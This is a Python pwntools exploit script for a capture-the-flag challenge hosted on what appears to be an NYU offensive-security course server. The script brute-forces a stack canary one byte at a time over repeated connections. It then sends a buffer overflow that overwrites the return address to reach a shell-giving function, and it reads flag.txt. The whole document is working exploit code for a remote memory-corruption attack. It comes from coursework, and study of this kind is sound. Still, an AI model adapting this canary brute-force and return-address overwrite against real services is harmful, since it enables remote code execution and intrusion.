#!/usr/bin/python
from __future__ import print_function
from pwn import *

debug = False
server = ""
port = 0
if debug:
    server = "localhost"
    port = 8000
else:
    server = "offsec-chalbroker.osiris.cyber.nyu.edu"
    port = 1340

giveShell = p64(0x400afd)
count = 0x88
overflow = 'A'*count

cookie = ""
conectionCount = 0
for _ in range(8):
    #We need to get each byte of the cookie
    count += 1
    tries = 0
    print("Report: Bruting byte: " + str(count - 0x88))
    for i in range(257):
        conectionCount += 1
        tries += 1
        #We need to connect each time to try
        p = remote(server, port)

        #If we're doing this for realz
        if not debug:
            p.recvuntil(":")
            p.sendline("krm504")

        p.recvuntil("name?")
        p.sendline(str(count))
        p.recvuntil("data")

        #We need to do the thing
        p.sendline(overflow + cookie + chr(i))
        if "bye!" in p.recvall(timeout=1): #Se if we right
            cookie += chr(i)
            print("Report: Got byte " + str(count-0x88) + " in " + str(tries) + " tries.")
            p.close()
            break
        p.close()
        #Uncomment the next line if you want to see the script running, otherwise give it like 30 minutes
        #print("Report: Working...")

#This was what I got..
#cookie = chr(0) + chr(117) + chr(189) + chr(203) + chr(17) + chr(137) + chr(65) + chr(147)

#Send final
p  = remote(server, port)
if not debug:
    p.recvuntil(":")
    p.sendline("krm504")
p.recvuntil("name?")
p.sendline(str(0xa0))
p.recvuntil("data")
p.sendline(overflow + cookie + 'A'*8 + giveShell)
for _ in range(10000000):
    pass
p.recvuntil("...\n\x00")
p.sendline("cat flag.txt")
flag = p.recvuntil("}")
p.close()
print("Report: " + flag)
